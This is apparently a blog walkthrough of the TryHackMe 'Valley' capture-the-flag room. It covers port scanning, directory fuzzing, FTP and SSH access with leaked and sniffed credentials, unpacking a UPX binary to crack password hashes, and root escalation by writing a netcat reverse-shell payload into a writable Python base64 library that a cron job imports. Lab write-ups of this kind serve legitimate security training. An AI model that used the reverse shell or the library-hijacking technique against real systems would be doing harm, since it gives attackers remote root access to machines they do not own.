---
id: 498
title: "Valley | TryHackMe - walkthrough"
created: 2023-06-22T15:51:01+00:00
url: https://hacklido.com/blog/498-valley-tryhackme-walkthrough
words: 1449
---

# Valley | TryHackMe - walkthrough

[image]

This time we are looking at how to solve a easy room in tryhackme, but do note that since it is labelled as easy room, it might not be as we will be doing combination of easy tasks, from directory brute forcing, to analyzing pcap file and to reverse engineering a simple program. It’s neither too hard or too easy room, somewhere in between the '‘Goldilocks’', zone and perfect for us to try and test our cyber skills.

TryHackMe room url :  https://tryhackme.com/room/valleype https://tryhackme.com/room/valleype

# 1. Initial scan.

```
`rustscan -g -a 10.10.207.225`
```

This displays ports [22,80,37370] as open, that is ssh, http and the port 37370 tells that it is an FTP service running out there. Now, let perform service detection, operating system detection and vulnerability scanning.

```
`sudo rustscan  --ulimit 5000 -a 10.10.207.225 -- -A -sN --top-ports 1024 --script=vuln -oX valley.xml --reason --stats-every 5s`
```

 https://hacklido.com/blog/496-attackerkb-source-tryhackme-walk-through#1-Discovering-the-lay-of-the-land--scanning-and-enumeration%5D- If this scan is too complex or something does not make any sense kindly google out or refer to the first section of my other writeup. Now convert this .xml file into .html for smooth rendering and to understand the scan results in easy way using the following command.

```
`xsltproc valley.xml -o valley.html`
```

Use your favorite web browser to view the output.

[image]

This shows that there are some vulnerability in ssh, for leet hackers you can try to exploit this vulnerability but to solve this room this is not needed as we will be going down the rabbit hole and the room was not intended to solve this way. We see that we have encountered an linux machine and our scan got completed in 82.94 seconds.

[image]

# 2. DIRECTORY BRUTE FORCING

Here we see a website, and this website renders images. Note that these images load in directories of the website and we hope something juicy is hidden here. So we use our gobuster to enumerate the directories.

```
`sudo gobuster dir -u http://10.10.207.225/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
```

[image]

 Make sure to replace this IP, with your tryhackme machine IP address.  Now we particularly see an interesting directory called as static, but we need to give correct number to view it’s content so we create an word listing using seq tool.

```
`seq -w 00 99 > number.txt`
```

Now again use ffuf tool for fuzzing to find juicy information.

```
`ffuf -w numbers.txt -u http://10.10.207.225/static/FUZZ`
```

[image]

[image]

Under /static/00 we find a directory that has been listed to be removed, so we check what’s there and we find a login page. For the leet hacker who are planning to cracking the username and password, there is no need as this is easy room so something might be something lurking in the source page of the website.

[image]

[image]

 Checking the source code, we find dev.js file, let’s see if something is there inside it.

[image]

 Turns out our guess was right, let’s check, if these credentials work.

[image]

So they are not the password and username for this web page login. Hmmm, let’s try something else, what if FTP was running, well let’s try these credentials.

# 3. FTP

Since the port 37370 is running ftp, let’s try if these credentials belong to ftp service.

```
`ftp 10.10.207.225 37370`
```

[image]

Enter username and correct password which we have found from the source code of login page, now get all the files with mget command.

```
`mget *.*`
```

# 4. Wireshark / pcap analysis.

Here we are given three pcap files in hopes that the tryhackme room solver get hold on the password from the pcap file. Analyzing and look on all the pcap files would be a waste of time so let me help you a little bit, the password is in siemHTTP2.pcapng file. Use wireshark to open this file.

```
`sudo wireshark siemHTTP2.pcapng`
```

You should notice that there are two thousand plus packets, and we need to find password, which is really an intimidating task. But fear not as we know that password authentication involves in http post request, therefore let’s apply wireshark filter and check for the password.

```
`http.request.method==POST`
```

We are shown five packets and there is a post request to index.html page, and the protocol is listed as http so let’s check that packet out.

[image]

Right click on this packet, and click on follow TCP STREAM option.

[image]

Here we get username and password, save these credentials now use it to login into ssh service with these username and password.

# 5. SSH ….

Now from the username and password from the previous task, let login into the machine using SSH.

```
`ssh username@10.10.207.225`
```

[image]

Let’s navigate and search a bit, let’s look at contents here and here luckily we find user flag.

[image]

After some navigation, in /home directory we see a program or executable file called '‘valleyAuthenticator’'. We could analyze the file in the same system but strings and other utilities are not installed so we try to transfer this file to our system using scp.

```
`scp valleyDev@10.10.207.225:/home/valleyAuthenticator .`
```

The terminal will prompt for password, hit the password and file will be transferred. This method is less messy than hosting a python server and then getting the file and personally I found this simple and easy.

# 6. Reverse engineering the file …

First let’s look at the strings of this file.

```
`strings valleyAuthenticator`
```

We see some random upx strings at the end of the line. UPX is a portable, extendable, high-performance executable packer for several different executable formats. It achieves an excellent compression ratio and offers very fast decompression. So let’s decompress the file and then check for strings.

```
`upx -d valleyAuthenticator
strings valleyAuthenticator`
```

But wait, the decompressed file has lot of strings so without getting down the rabbit hole let’s use some command line kung-fu to get the password.

```
`strings valleyAuthenticator | grep -i pass -B 15 -A 15`
```

[image]

 https://explainshell.com/explain?cmd=strings+valleyAuthenticator+%7C+grep+-i+pass+-B+15+-A+15 Explanation for this command can be found in this url. Grab these hashes and go to crackstation. net website to crack these hashes. Note that they will serve as ssh login credentials for another user.

[image]

# 7. SSH into another user, and escalate your privileges.

```
`ssh username2@machine ip `
```

For all the leet hackers who want to try linpeas for privilege escalation, first of all, sudo is not enabled for this particular user and second, simple commands like curl will not work. So even if you enable simple python server in your machine and transfer your file and then run this script it will not work.

[image]

Hmmm, let’s use our past experiences, or surf on google some techniques or go through how other people have solved this room. Since The crontab is used to automate all types of tasks on Linux systems we expect some juicy stuff to exist.

[image]

We see a python script let’s look at it’s contents.

[image]

This script utilizes base64 library to encode an image into base64. What if we modify the base64 library in such a way that it connects back to our system and we get a reverse shell that would be awesome right. So let’s locate base64 library and check if it’s write-able.

```
`locate base64
ls -al /usr/lib/python3.8/base64.py`
```

It shows that this file is write-able so let’s do some hacking.

Now go to payload all things, and search for netcat openbsd reverse shell. Make note of it and then edit the base64 file add these two lines as shown here.

[image]

```
`import os
os.system('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc your tryhackme ip address 4242 >/tmp/f')`
```

Save the file, open a netcat listener in another terminal and wait for it to connect.

```
`nc -nvlp 4242`
```

[image]

With this we complete this room. Even though it was intimidating at first glance, and took some time to solve and document the process this room was not as difficult as we assumed in the beginning of the write-up. Congratulations if you have made this far and yes we have pwned the valley, happy hacking….
